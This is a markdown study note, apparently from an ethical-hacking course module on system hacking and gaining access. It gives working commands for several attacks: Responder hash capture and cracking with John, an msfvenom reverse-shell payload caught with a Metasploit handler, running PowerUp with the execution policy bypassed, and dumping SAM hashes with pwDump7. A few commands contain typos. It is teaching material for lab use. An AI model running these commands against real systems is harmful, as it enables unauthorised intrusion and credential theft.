# Module 6

## System Hacking
The ethical hacking phase where testers exploit vulnerabilities to obtain unauthorized entry into systems, demonstrating potential real-world attack paths.

**Objective**: Simulate how an attacker would exploit vulnerabilities to demonstrate risk.

**Approach**: Done only in lab environments or with explicit permission.

**Steps involved**:
- Exploitation of known vulnerabilities (using tools like Metasploit).
- Password attacks (brute-force, dictionary, credential stuffing).
- Exploiting misconfigurations (weak services, unpatched systems).
- Social engineering (phishing, malicious payloads).

---

### 1. Gain access to the system
The penetration testing phase where attackers exploit discovered vulnerabilities to enter a target system and establish unauthorized access.

#### 1.1 Perform Active Online Attack to Crack the System’s Password using Responder
LLMNR (link local multicast name resolution) and NBT-NS (netbios namer service) are used to performe name resolution on the local link.

Responder is LLMNR, NBT-NS, MDNS poisoner. By default the tool only responds to SMB.

**Steps**:
- Check the interfaces
  - `ifconfig`
- Now run responder on the interface.
  - `sudo responder -I ens33`
- Now when a user on the LAN try to access the unavailable share, responder will capture the hash.
- Logs are stored in /usr/share/responder folder. We will have a hash. Now crack it with John.
- On ubuntu you can install john as 
  - `sudo snap install john-the-ripper`
  - `sudo john /home/ubuntu/Responder/logs/SMB-NTLMv2-SSP-10.10.10.10.txt`

#### 1.2 Audit system passwords using Lophtcrack 
Windows tool can crack other password on remote machine if you know a single account utilizing SMB. Use password auditing. use password auditing wizard.

[L0phtCrack](https://l0phtcrack.gitlab.io/)

#### 1.3 Find Vulnerabilities on exploit sites

[Offensive Security’s Exploit Database Archive](https://www.exploit-db.com/)

#### 1.4 Gain Access to a Remote System using Reverse Shell Generator

**Steps**:
- Create msfvenom payload
  - `msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x64 LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.ex`
- Using apache to transfer the file
  - `mkdir /var/www/html/share`
  - `chmod -R 755 /var/www/html/share`
  - `chmod -R www-data:www-data /var/www/html/share`
  - `service apche2 start`
- Now run msfconsole
  - `msfconsole`
  - `use exploit/multi/handler`
- Set the payload type, port and IP and visit the IP to download the executable. Run it you will get the shell
- You can run the following commands in meterpreter
  - `sysinfo`  //get system information
- Upload file through meterpreter
- The powersploit priv escaltion script./usr/share/windows-resources/powersploit
  - `upload PowerUp.ps1 powerup.ps1`
- Now get shell
  - `shell`
- Now execute the script
  - `powershell -ExecutionPolicy bypass -command ". .\powerup.ps1;invoke-All-Checks"`
- Now exit it and to get a VNC from meterpreter use the following command
  - `run vnc`

[Online - Reverse Shell Generator](https://www.revshells.com/)

#### 1.5 Gain access to a system using armitage

**Steps**:
- GUI based msf
  - `service postgresql start`
- Now run armitage from Applications menu. Run intense scan. and then we can create a payload according to our target
- Once the victim opens the payload, we get the session.

#### 1.6 Gain access to system using Ninja Jonin

**Steps**:
- Ninja is installed on target and Jonin on attacker machine.
  - [GitHub](https://github.com/ErAz7/Ninja)
- We need to edit its config file to change the ip and port.
<img width="646" height="448" alt="image" src="https://github.com/user-attachments/assets/b623ed60-ae2b-4f70-ac26-458f3f80bcd2" />
- Open the Jonin listenere. it will catch the sessions.
  - `list`  //to list all sessions
  - `connect 1` //to connect to session
  - //to get to cmd
    - `change`
    - `cmd`
  - `help` //displays help

#### 1.7 Buffer Overflow
A security vulnerability that occurs when a program writes more data into a buffer (temporary storage) than it can hold, causing adjacent memory to be overwritten and potentially allowing attackers to execute malicious code.

- [Simple Stack Based Buffer Overflow Tutorial for Vulnserver · The Grey Corner](https://thegreycorner.com/2011/03/11/simple-stack-based-buffer-overflow.html)
- [Buffer Overflow | Pentesting Quick Reference OSCP and Beyond](https://notes.cavementech.com/pentesting-quick-reference/buffer-overflow)

**Tools required**:
- [Vulnerable server used for learning software exploitation](https://github.com/stephenbradshaw/vulnserver)
- [https://debugger.immunityinc.com/](https://debugger.immunityinc.com/)

#### 1.8 System  Password hacking
System Password Hacking is the process of attempting to crack or bypass authentication mechanisms to gain unauthorized access to a system, typically using techniques like brute force, dictionary attacks, phishing, or exploiting weak/hashed passwords.

- `pwDump7.exe> hashes.txt` //To Dump Windows SAM file hashes

---

### 2. Privilege Escalation
Process of exploiting vulnerabilities, misconfigurations, or weak permissions to gain higher-level access rights (e.g., from a normal user to administrator/root) within a system or network.

